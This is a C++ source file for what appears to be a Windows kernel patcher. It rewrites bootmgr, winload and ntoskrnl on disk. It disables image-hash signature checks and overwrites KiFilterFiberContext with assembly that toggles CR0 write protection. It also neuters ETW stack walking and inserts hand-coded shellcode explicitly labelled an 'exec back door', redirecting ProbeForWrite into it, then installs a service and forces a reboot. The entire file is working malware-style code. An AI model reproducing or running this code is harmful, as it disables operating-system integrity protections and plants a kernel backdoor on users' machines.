#include "Global.h"

int main()
{
	//get boot type
	auto BootType = GetBootMode();
	if (BootType == FirmwareTypeUnknown)
		TerminateProcess(NtCurrentProcess(), -1);
	
	//get system files location (+ backup files paths)
	wchar_t bootmgrP1[128], winloadP1[128], ntoskrnlP1[128];
	DeterminePathsSystemFiles(BootType, bootmgrP1, winloadP1, ntoskrnlP1);
	wchar_t bootmgrP2[MAX_PATH], winloadP2[MAX_PATH], ntoskrnlP2[MAX_PATH];
	GetSystemFilesBackupPaths(bootmgrP2, winloadP2, ntoskrnlP2);
	
	//need cleanup (patch reboot)
	if (FileExists(ntoskrnlP2))
	{
		uint32_t FileSize;
		auto TmpBuff = _alloca(26214400); //25MB

		//restore ntoskrnl
		ReadFileToBuff(ntoskrnlP2, TmpBuff, &FileSize);
		WriteBuffToFile(ntoskrnlP1, TmpBuff, FileSize);
		DeleteFileW(ntoskrnlP2);

		//restore winload
		ReadFileToBuff(winloadP2, TmpBuff, &FileSize);
		WriteBuffToFile(winloadP1, TmpBuff, FileSize);
		DeleteFileW(winloadP2);

		//restore bootmgr
		ReadFileToBuff(bootmgrP2, TmpBuff, &FileSize);
		WriteBuffToFile(bootmgrP1, TmpBuff, FileSize);
		DeleteFileW(bootmgrP2);

		//cleanup & close process
		DoDeleteSvc();
		TerminateProcess(NtCurrentProcess(), 0);
		return 0;
	}

	//read bootmgr (+ bak)
	uint32_t bootmgrRawSize;
	auto bootmgrBuff = _alloca(5242880); //5MB
	if (!ReadFileToBuff(bootmgrP1, bootmgrBuff, &bootmgrRawSize)) {
		TerminateProcess(NtCurrentProcess(), -1);
		return 0;
	}
	WriteBuffToFile(bootmgrP2, bootmgrBuff, bootmgrRawSize);
	
	//legacy bootmgr (static patch)
	if (BootType == FirmwareTypeBios) {
		DecrtBytes(bootmgrFix, sizeof(bootmgrFix), bootmgrFix);
		bootmgrBuff = (void*)&bootmgrFix[0];
		bootmgrRawSize = sizeof(bootmgrFix);
	}

	//read winload (+ bak)
	uint32_t winloadRawSize;
	auto winloadBuff = _alloca(5242880); //5MB
	ReadFileToBuff(winloadP1, winloadBuff, &winloadRawSize);
	WriteBuffToFile(winloadP2, winloadBuff, winloadRawSize);

	//read ntoskrnl (+ bak)
	uint32_t ntoskrnlRawSize;
	auto ntoskrnlBuff = _alloca(26214400); //25MB
	ReadFileToBuff(ntoskrnlP1, ntoskrnlBuff, &ntoskrnlRawSize);
	WriteBuffToFile(ntoskrnlP2, ntoskrnlBuff, ntoskrnlRawSize);

	//get offsets
	auto ProbeForWriteOff = GetSymAddress(ntoskrnlP2, "ProbeForWrite");
	auto EtwpStackWalkApcOff = GetSymAddress(ntoskrnlP2, "EtwpStackWalkApc");
	auto KiFilterFiberContextOff = GetSymAddress(ntoskrnlP2, "KiFilterFiberContext");
	auto ImgpValidateImageHashWinLoadOff = GetSymAddress(winloadP2, "ImgpValidateImageHash");
	auto ExRaiseDatatypeMisalignmentOff = GetSymAddress(ntoskrnlP1, "ExRaiseDatatypeMisalignment");
	auto ImgpValidateImageHashBootMgrOff = (BootType == FirmwareTypeUefi) ? 
		GetSymAddress(bootmgrP2, ("ImgpValidateImageHash")) : (uint8_t*)0xFACEDEAD;
	
	//offsets failed
	if (!ProbeForWriteOff ||
		!EtwpStackWalkApcOff ||
		!KiFilterFiberContextOff ||
		!ExRaiseDatatypeMisalignmentOff ||
		!ImgpValidateImageHashWinLoadOff ||
		!ImgpValidateImageHashBootMgrOff) 
	{
		//cleanup & close
		//SymFolderCleanup();
		TerminateProcess(NtCurrentProcess(), -1);
		return -1;
	}

	//patch ImgpValidateImageHash (bootmgfw)
	if (BootType == FirmwareTypeUefi) {
		*(uint32_t*)RVA_VA(bootmgrBuff, (uint64_t)ImgpValidateImageHashBootMgrOff) = 0xC3C031;
		FixPeChkSum(bootmgrBuff, bootmgrRawSize);
	}

	//patch ImgpValidateImageHash (winload)
	*(uint32_t*)RVA_VA(winloadBuff, (uint64_t)ImgpValidateImageHashWinLoadOff) = 0xC3C031;
	FixPeChkSum(winloadBuff, winloadRawSize);

	//build patch ntoskrnl
	auto checkSumOff = (int32_t)((uint64_t)&RtlImageNtHeader(ntoskrnlBuff)->OptionalHeader.CheckSum - (uint64_t)ntoskrnlBuff);
	auto patchOff0 = int32_t((uint8_t*)checkSumOff - (KiFilterFiberContextOff + 7));
	auto checkSumOrg = RtlImageNtHeader(ntoskrnlBuff)->OptionalHeader.CheckSum;

	//build asm (KiFilterFiberContext)
	const uint8_t asmpatch[] = {
		0x4C, 0x8D, 0x05, DWORD2BYTES(patchOff0),   //lea r8, relLONG
		0x53,                                       //push rbx
		0x0f, 0x20, 0xc3,                           //mov rbx, cr0
		0x48, 0x89, 0xd8,                           //mov rax, rbx
		0xb9, 0xff, 0xff, 0xfe, 0xff,               //mov ecx, 0xfffeffff
		0x48, 0x21, 0xc8,                           //and rax, rcx
		0x0f, 0x22, 0xc0,                           //mov cr0, rax
		0x41, 0xC7, 0x00, DWORD2BYTES(checkSumOrg), //mov dword ptr[r8], chkSumUL
		0x0f, 0x22, 0xc3,                           //mov cr0, rbx
		0x5b,                                       //pop rbx
		0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,   //mov rax, 1
		0xC3                                        //ret
	};

	//patch KiFilterFiberContext (ntoskrnl)
	memcpy(RVA_VA(ntoskrnlBuff, (uint64_t)KiFilterFiberContextOff), asmpatch, sizeof(asmpatch));

	//patch EtwpTraceStackWalk (ntoskrnl) //sit d0g!!1
	*(uint8_t*)RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff) = 0xC3;

	//add exec back door (ntoskrnl)
	const uint8_t backDoor[] = {
		0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x01, 0x48, 0xBA,
		0xDE, 0xC0, 0xED, 0xFE, 0xAD, 0xDE, 0xCE, 0xFA, 0x48, 0x3B, 0xC2, 0x75,
		0x44, 0x48, 0x8B, 0x41, 0x48, 0x4C, 0x8B, 0x51, 0x08, 0x4C, 0x8B, 0x49,
		0x28, 0x4C, 0x8B, 0x41, 0x20, 0x48, 0x8B, 0x51, 0x18, 0x49, 0x89, 0x43,
		0xF0, 0x48, 0x8B, 0x41, 0x40, 0x49, 0x89, 0x43, 0xE8, 0x48, 0x8B, 0x41,
		0x38, 0x49, 0x89, 0x43, 0xE0, 0x48, 0x8B, 0x41, 0x30, 0x48, 0x89, 0x4C,
		0x24, 0x50, 0x48, 0x8B, 0x49, 0x10, 0x49, 0x89, 0x43, 0xD8, 0x41, 0xFF,
		0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC4,
		0x48, 0xC6, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00
	};
	memcpy(RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff + 1), backDoor, sizeof(backDoor));
	
	//find call ExRaiseDatatypeMisalignment in ProbeForWrite
	for (int i = 0; i < 0x80; i++) {
		if ((uint64_t)ExRaiseDatatypeMisalignmentOff == RVA(ntoskrnlBuff, ProbeForWriteOff + i, 5)) {
			auto patchOff1 = int32_t((uint8_t*)EtwpStackWalkApcOff + 1 - (ProbeForWriteOff + i + 5));
			*(int32_t*)RVA_VA(ntoskrnlBuff, (uint64_t)ProbeForWriteOff + i + 1) = patchOff1;
		}
	}

	//fix ntoskrnl checksum
	FixPeChkSum(ntoskrnlBuff, ntoskrnlRawSize);

	//write bootmgr
	WriteBuffToFile(bootmgrP1, bootmgrBuff, bootmgrRawSize);
	if (BootType == FirmwareTypeBios) {
		RtlSecureZeroMemory(bootmgrBuff, bootmgrRawSize);
	}

	//write winload
	WriteBuffToFile(winloadP1, winloadBuff, winloadRawSize);
	
	//write ntoskrnl
	WriteBuffToFile(ntoskrnlP1, ntoskrnlBuff, ntoskrnlRawSize);

	//install cleanup service
	SvcInstall();

	//force reboot
	PrivilegeMgr("SeShutdownPrivilege", true);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	PrivilegeMgr("SeShutdownPrivilege", false);

	//force close (bug hehe...)
	//SymFolderCleanup();
	TerminateProcess(NtCurrentProcess(), 0);
	return 0;
}